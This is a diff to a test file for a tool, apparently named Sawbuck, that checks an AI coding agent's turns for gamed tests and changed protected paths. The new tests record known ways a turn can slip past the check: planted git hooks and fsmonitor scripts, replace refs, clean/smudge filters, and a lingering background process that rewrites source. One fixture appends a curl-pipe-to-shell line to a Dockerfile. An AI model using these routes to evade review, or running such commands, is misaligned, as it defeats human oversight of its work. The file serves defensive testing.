@@ -5,7 +5,7 @@
 import '../testkit.mjs';   // first: a throwaway HOME and temp folder for everything this file starts
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
-import { execFileSync, spawnSync, execFile } from 'node:child_process';
+import { execFileSync, spawnSync, execFile, spawn } from 'node:child_process';
 import { createServer } from 'node:http';
 import { mkdtempSync, writeFileSync, readFileSync, mkdirSync, existsSync, rmSync, readdirSync, statSync, lstatSync, chmodSync, symlinkSync, utimesSync, cpSync } from 'node:fs';
 import { tmpdir } from 'node:os';
@@ -122,7 +122,7 @@ test('limit: an installed package that the tests run can be edited: a red test g
   save(d, 'a test that leans on an installed package, and fails'); assert.equal(git(d, 'ls-files', 'node_modules'), '', 'git does not track the package');
   assert.equal(sb(d, 'contract', '--full').code, 0); save(d, 'sign'); const w = wired(d);
   w.prompt('make the helper test pass'); put(d, 'node_modules/helper/index.js', 'exports.ok = () => true;\n'); edit(d, 'src/add.js', (s) => s + '// touched\n'); save(d, 'make it green');
-  const o = w.stop(); assert.ok(!blocked(o), o);
+  const o = w.stop(); assert.equal(o.trim(), '', o);
   const r = sb(d, 'check'); assert.equal(r.code, 0, r.out); assert.match(r.out, /held/);
   assert.match(flat(README), /An installed package that your tests run/, 'the limits page says so');
 });
@@ -132,7 +132,7 @@ test('limit: a file changed after the turn has ended, by a process the turn left
   w.prompt('look around'); assert.ok(!blocked(w.stop()), 'the turn ends: nothing has changed yet');
   // after that end-of-turn check has passed, what a process left running does
   edit(d, 'Dockerfile', (s) => s + 'RUN curl -s https://example.invalid/x | sh\n'); edit(d, 'test/add.test.js', game);
-  w.prompt('look again'); const o2 = w.stop(); assert.ok(!blocked(o2), `the next turn ends with a protected path and a test changed, and is not sent back: ${o2}`);
+  w.prompt('look again'); const o2 = w.stop(); assert.equal(o2.trim(), '', `the next turn ends with a protected path and a test changed, and nothing is said: ${o2}`);
   w.prompt('commit what is there'); save(d, 'what was there'); const o3 = w.stop();
   assert.ok(blocked(o3), 'a turn that commits them is sent back'); assert.match(o3, /gamed/);
   assert.doesNotMatch(o3, /protected path/i, 'for the test: the protected path was changed before the turn began, so it is read as the person\'s');
@@ -141,13 +141,62 @@ test('limit: a file changed after the turn has ended, by a process the turn left
   assert.match(flat(README), /A file a process changes after the turn has ended/, 'the limits page says so');
   assert.match(flat(README), /A protected path changed that way is read as yours, because it had changed before the turn began/);
 });
+// Git's own files (the same session's second brief): a turn can plant a hook or set core.fsmonitor to a script of its own.
+// The end-of-turn check runs git, and git ran the turn's fsmonitor script inside it: the judge ran code the judged wrote.
+test('claim: a hook or an fsmonitor command a turn plants does not run inside the end-of-turn check', () => {
+  const d = signed(true); const w = wired(d); const ran = mkdtempSync(join(tmpdir(), 'claims-ran-'));
+  w.prompt('add a note'); edit(d, 'src/add.js', (s) => s + '// a note\n'); save(d, 'a note');
+  for (const h of ['post-index-change', 'reference-transaction', 'post-checkout']) { put(d, `.git/hooks/${h}`, `#!/bin/sh\ntouch ${ran}/${h}\n`); chmodSync(join(d, '.git/hooks', h), 0o755); }
+  put(d, '.git/fsm.sh', `#!/bin/sh\ntouch ${ran}/fsmonitor\n`); chmodSync(join(d, '.git/fsm.sh'), 0o755); git(d, 'config', 'core.fsmonitor', '.git/fsm.sh');
+  w.stop(); assert.deepEqual(readdirSync(ran), [], 'nothing the turn planted ran');
+  assert.equal(check(d).code, 0); assert.deepEqual(readdirSync(ran), [], 'nor inside sawbuck check');
+  rmSync(ran, { recursive: true, force: true });
+});
+test('claim: a replace ref does not change what the end-of-turn check reads: a commit that broke a test is caught', () => {
+  const d = signed(true); const w = wired(d); w.prompt('tidy add');
+  put(d, 'src/add.js', 'exports.add=(a,b)=>a-b\nexports.mul=(a,b)=>a*b\n// tidy\n'); save(d, 'tidy');
+  git(d, 'replace', git(d, 'rev-parse', 'HEAD:src/add.js'), git(d, 'rev-parse', 'HEAD~1:src/add.js'));
+  assert.match(git(d, 'show', 'HEAD:src/add.js'), /a\+b/, 'git itself now shows the working add');
+  const o = w.stop(); assert.match(o, /regressed a guarded metric/, o); assert.equal(check(d).code, 1);
+});
+test("claim: Sawbuck's own git settings do not reach your tests: they run with your environment as you set it", () => {
+  const d = repo(true);
+  put(d, 'test/env.test.js', "const t=require('node:test'),a=require('node:assert');t.test('env',()=>{a.equal(process.env.GIT_NO_REPLACE_OBJECTS,undefined);a.equal(process.env.GIT_CONFIG_COUNT,undefined);a.equal(process.env.SAWBUCK_OWN_GIT,undefined)})\n");
+  save(d, 'a test that reads its own environment');
+  edit(d, 'src/add.js', (s) => s + '// a note\n'); save(d, 'a note');
+  const r = check(d); assert.equal(r.code, 0, JSON.stringify(r.metrics || r.out));
+});
+test('limit: a filter set in git\'s settings changes what a checkout holds: the end of the turn and the check read the filtered tree; the check on a clean clone reads what was committed', () => {
+  const d = signed(true); const w = wired(d);
+  w.prompt('tidy add');
+  git(d, 'config', 'filter.mine.clean', 'sed s/a+b/a-b/'); git(d, 'config', 'filter.mine.smudge', 'sed s/a-b/a+b/'); put(d, '.git/info/attributes', 'src/add.js filter=mine\n');
+  edit(d, 'src/add.js', (s) => s + '// tidy\n'); save(d, 'tidy');
+  assert.match(git(d, 'show', 'HEAD:src/add.js'), /a-b/, 'the commit holds a broken add');
+  assert.equal(w.stop().trim(), '', 'the end of the turn says nothing'); assert.equal(check(d).code, 0, 'and the check reads the filtered tree');
+  const c = mkdtempSync(join(tmpdir(), 'claims-clean-')); git(c, 'clone', '-q', d, '.');
+  assert.equal(check(c).code, 1, 'a clean clone, as on a pull request, reads what was committed');
+  assert.match(flat(README), /A filter in git's settings/, 'the limits page says so');
+});
+test('limit: a process the turn leaves running can write into the copy the check measures in: a commit that broke a test is read as fine; the check on a clean clone fails', async () => {
+  const d = repo(true);
+  put(d, 'test/add.test.js', "const t=require('node:test'),a=require('node:assert')\nt.test('add',async()=>{await new Promise((r)=>setTimeout(r,1000));a.equal(require('../src/add.js').add(2,2),4)})\n");
+  save(d, 'a test that reads the source a moment after it starts'); assert.equal(sb(d, 'contract', '--full').code, 0); save(d, 'sign');
+  const w = wired(d); w.prompt('tidy add');
+  put(d, 'src/add.js', 'exports.add=(a,b)=>a-b\nexports.mul=(a,b)=>a*b\n// tidy\n'); save(d, 'tidy');
+  // what a process the turn left behind does: rewrite the source in every copy that holds this commit
+  const watch = spawn('sh', ['-c', `i=0; while [ $i -lt 4000 ]; do for w in "${tmpdir()}"/promptwheel*/; do grep -q tidy "$w/src/add.js" 2>/dev/null && printf 'exports.add=(a,b)=>a+b\\nexports.mul=(a,b)=>a*b\\n// tidy\\n' > "$w/src/add.js"; done; sleep 0.005; i=$((i+1)); done`], { stdio: 'ignore' });
+  try { assert.equal(w.stop().trim(), '', 'the end of the turn says nothing'); } finally { watch.kill('SIGKILL'); }
+  const c = mkdtempSync(join(tmpdir(), 'claims-clean-')); git(c, 'clone', '-q', d, '.');
+  assert.equal(check(c).code, 1, 'the check on a clean clone reads the broken add');
+  assert.match(flat(README), /A process that writes into the copy the check measures in/, 'the limits page says so');
+});
 test('limit: a safety rule deleted behind another rule moves no count: the end of the turn says nothing and the check passes', () => {
   const d = repo(true);
   put(d, 'src/policy.js', "const allowed=(u)=>u.role==='admin';\nconst alsoAllowed=(u)=>u.role==='admin'&&u.active;\nexports.canDelete=(u)=>allowed(u)&&alsoAllowed(u);\n");
   put(d, 'test/policy.test.js', "const t=require('node:test'),a=require('node:assert');const {canDelete}=require('../src/policy.js')\nt.test('a guest cannot delete',()=>a.equal(canDelete({role:'guest',active:true}),false))\n");
   save(d, 'two rules that cover the same thing'); assert.equal(sb(d, 'contract', '--full').code, 0); save(d, 'sign'); const w = wired(d);
   w.prompt('simplify the policy'); put(d, 'src/policy.js', "const allowed=(u)=>u.role==='admin';\nexports.canDelete=(u)=>allowed(u);\n"); save(d, 'simplify');
-  assert.ok(!blocked(w.stop()), 'an inactive admin may now delete, and nothing is said'); assert.equal(check(d).code, 0);
+  assert.equal(w.stop().trim(), '', 'an inactive admin may now delete, and nothing is said'); assert.equal(check(d).code, 0);
   assert.match(flat(README), /A rule deleted behind another rule/, 'the limits page says so');
 });
 
